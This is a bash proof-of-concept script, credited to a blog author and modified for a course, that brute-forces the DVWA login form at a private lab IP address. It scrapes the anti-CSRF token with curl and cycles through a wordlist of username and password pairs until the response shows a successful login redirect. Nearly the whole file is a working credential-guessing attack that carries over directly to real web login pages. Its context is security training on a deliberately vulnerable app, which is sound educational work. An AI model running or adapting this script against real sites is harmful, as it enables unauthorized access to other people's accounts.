#!/bin/bash

# Quick PoC template for HTTP POST form brute force, with anti-CRSF token

# Target: DVWA v1.10

# Date: 2015-10-19

# Author: g0tmi1k ~ https://blog.g0tmi1k.com/

# Modded by:JJA for infosec1 on 2020.10.31

# Source: https://blog.g0tmi1k.com/dvwa/login/




## Prep password list

awk '!/comment/' /usr/share/wordlists/john-the-ripper.txt > /usr/share/dvwa_pss.lst

chmod 775 /usr/share/dvwa_pss.lst

## Variables

URL="http://192.168.250.18/"

USER_LIST="/usr/share/dvwa_pss.lst"

PASS_LIST="/usr/share/dvwa_pss.lst"

start=$(date +%Y%m%d%H%M%S)

echo "[i]Attacking>>>>>>>>>>>> the online website: ${URL}"

echo "-----------------------------------+-------------------------"

echo "[i]Using the file: ${USER_LIST} for the user list and the file: ${PASS_LIST} for the password list."

sleep 9

cheat=$1

if [ ${cheat} = cheat ]; then

        sed -i '1s/^/password\n/' /usr/share/dvwa_pss.lst

        echo "[i] WINNING!"

        sleep 3

fi

## Value to look for in response (Whitelisting)

SUCCESS="Location: index.php"

 

## Anti CSRF token

CSRF="$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2 )"

[[ "$?" -ne 0 ]] && echo -e '\n[!] Issue connecting! #1' && exit 1

 

## Counter

i=0

 

## Password loop

while read -r _PASS; do

 

  ## Username loop

  while read -r _USER; do

 

    ## Increase counter

    ((i=i+1))

 

    ## Feedback for user

    echo "[i] Attempt# ${i}: User:${_USER} ---+--- Pass:${_PASS}"

 

    ## Connect to server

    #CSRF=$( curl -s -c /tmp/dvwa.cookie "${URL}/login.php" | awk -F 'value=' '/user_token/ {print $2}' | awk -F "'" '{print $2}' )

    REQUEST="$( curl -s -i -b /tmp/dvwa.cookie --data "username=${_USER}&password=${_PASS}&user_token=${CSRF}&Login=Login" "${URL}/login.php" )"

    [[ $? -ne 0 ]] && echo -e '\n[!] Issue connecting! #2'

 

    ## Check response

    echo "${REQUEST}" | grep -q "${SUCCESS}"

    if [[ "$?" -eq 0 ]]; then

      ## Success!

      end=$(date +%Y%m%d%H%M%S)

      echo -e "\n\n[i]On Attempt ${i} The Password Was Found!"

      echo "[i]Username: ${_USER}"

      echo "[i]Password: ${_PASS}"

      echo "[i]Online attack started ${start}, and ended at ${end}"

      break 2

    fi

 

  done < ${USER_LIST}

done < ${PASS_LIST}

 

## Clean up

rm -f /tmp/dvwa.cookie
